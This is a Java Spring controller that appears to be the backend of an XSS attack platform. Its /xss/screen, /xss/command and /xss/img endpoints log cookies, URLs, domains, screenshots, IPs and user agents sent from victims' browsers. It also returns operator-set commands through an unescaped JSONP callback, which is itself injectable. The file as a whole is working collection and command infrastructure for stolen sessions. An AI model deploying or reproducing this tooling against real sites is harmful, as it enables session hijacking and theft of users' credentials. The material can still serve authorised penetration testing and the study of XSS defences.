package com.bin.kong.security.server.controller.xss;

import com.alibaba.fastjson.JSON;
import com.bin.kong.security.contract.common.GenericResponse;
import com.bin.kong.security.core.constants.ResponseConstants;
import com.bin.kong.security.core.enums.XssTypeEnum;
import com.bin.kong.security.core.utils.PPStringUtils;
import com.bin.kong.security.model.xss.entity.XssInfo;
import com.bin.kong.security.model.xss.search.XssInfoSearch;
import com.bin.kong.security.server.service.xss.IXssInfoService;
import lombok.NonNull;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;

@RestController
@RequestMapping(value = "")
@Slf4j
public class XssInfoController {
    @Resource
    private IXssInfoService xssInfoService;

    /**
     * xxs 攻击请求接受
     *
     * @return
     */
    @RequestMapping(value = "/xss/screen")
    public GenericResponse xss_info_screen_add(HttpServletRequest request) {
        GenericResponse response = new GenericResponse();
        try {
            XssInfo info = XssInfo.builder().build();
            AtomicReference<String> requestBody = new AtomicReference<>("");
            request.getParameterMap().keySet().forEach(key -> requestBody.set(key));
            XssInfo parseInfo = null;
            try {
                parseInfo = JSON.parseObject(requestBody.get(), XssInfo.class);
                parseInfo.setCookie(PPStringUtils.urlDecode(parseInfo.getCookie()));
            } catch (Exception e) {
            }
            if (null != parseInfo) {
                info = parseInfo;
            }
            info.setCreate_time(new Date());
            info.setIp(request.getRemoteAddr());
            if (StringUtils.isNotEmpty(info.getImg()))
                info.setImg(PPStringUtils.urlDecode(info.getImg()));
            info.setType(XssTypeEnum.SCREEN.getCode());

            info.setUser_agent(request.getHeader("User-Agent"));
            xssInfoService.insert(info);
            response.setStatus(ResponseConstants.SUCCESS_CODE);
            response.setData(info.getId());
        } catch (Exception e) {
            log.error("执行xss_info_add异常：" + e.getCause());
            response.setStatus(ResponseConstants.FAIL_CODE);
        }
        return response;
    }

    @RequestMapping(value = "/xss/command")
    public void xss_info_command(HttpServletRequest request, HttpServletResponse response) {
        try {
            GenericResponse genericResponse = new GenericResponse();
            try {
                if (StringUtils.isNotEmpty(request.getParameter("id"))) {
                    Integer id = Integer.valueOf(request.getParameter("id"));
                    XssInfo xssInfo = xssInfoService.get(id);
                    genericResponse.setData(xssInfo.getCommand());
                } else {
                    XssInfo xssInfo = XssInfo.builder()
                            .ip(request.getRemoteAddr())
                            .cookie(PPStringUtils.urlDecode(request.getParameter("cookie")))
                            .domain(PPStringUtils.urlDecode(request.getParameter("domain")))
                            .url(PPStringUtils.urlDecode(request.getParameter("url")))
                            .create_time(new Date())
                            .user_agent(request.getHeader("User-Agent"))
                            .type(XssTypeEnum.COMMAND.getCode())
                            .build();
                    xssInfoService.insert(xssInfo);
                    genericResponse.setData(xssInfo.getId());
                }
                genericResponse.setStatus(ResponseConstants.SUCCESS_CODE);

            } catch (Exception e) {
                log.error("执行xss_info_add异常：" + e.getCause());
                genericResponse.setStatus(ResponseConstants.FAIL_CODE);
            }
            String result = request.getParameter("callback") + "(" + JSON.toJSONString(genericResponse) + ")";
            response.getWriter().write(result);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * img 标签 xss攻击
     *
     * @param request
     * @return
     */
    @RequestMapping(value = "/xss/img")
    public GenericResponse xss_info_img_add(HttpServletRequest request) {
        GenericResponse response = new GenericResponse();
        try {
            XssInfo info = XssInfo.builder().build();
            if (StringUtils.isEmpty(info.getDomain()))
                info.setDomain(PPStringUtils.getDomainForUrl(request.getHeader("Referer")));
            if (StringUtils.isEmpty(info.getUrl()))
                info.setUrl(request.getHeader("Referer"));
            info.setCreate_time(new Date());
            info.setIp(request.getRemoteAddr());
            info.setType(XssTypeEnum.IMG.getCode());
            xssInfoService.insert(info);
            response.setStatus(ResponseConstants.SUCCESS_CODE);
            response.setData(ResponseConstants.FAIL_CODE);
        } catch (Exception e) {
            log.error("执行xss_info_img_add异常：" + e.getCause());
            response.setStatus(ResponseConstants.FAIL_CODE);
        }
        return response;
    }


    @RequestMapping(value = "/xssinfos/search", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
    public GenericResponse xss_info_list_search(@RequestParam String searchKey, @RequestParam Integer pageNum, @RequestParam Integer type) {
        GenericResponse response = new GenericResponse();
        try {
            XssInfoSearch search = XssInfoSearch.builder()
                    .searchKey(searchKey)
                    .type(type)
                    .pageNum(pageNum)
                    .build();
            List<XssInfo> xssInfoList = xssInfoService.searchList(search);

            Integer count = xssInfoService.searchCount(search);
            Map<String, Object> resultMap = new HashMap<>();
            resultMap.put("dataList", xssInfoList);
            resultMap.put("count", count);
            response.setStatus(ResponseConstants.SUCCESS_CODE);
            response.setData(resultMap);
        } catch (Exception e) {
            log.error("执行xss_info_list_search异常：" + e.getCause());
            response.setStatus(ResponseConstants.FAIL_CODE);
        }
        return response;

    }

    @RequestMapping(value = "/xssinfos/{id}", method = RequestMethod.PATCH, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
    public GenericResponse xss_info_patch(@PathVariable("id") @NonNull Integer id, @RequestBody XssInfo xssInfo) {
        GenericResponse response = new GenericResponse();
        try {
            xssInfo.setId(id);
            Integer count = xssInfoService.update(xssInfo);
            response.setStatus(ResponseConstants.SUCCESS_CODE);
            response.setData(count);
        } catch (Exception e) {
            log.error("执行xss_info_patch异常：" + e.getCause());
            response.setStatus(ResponseConstants.FAIL_CODE);
        }

        return response;
    }
}
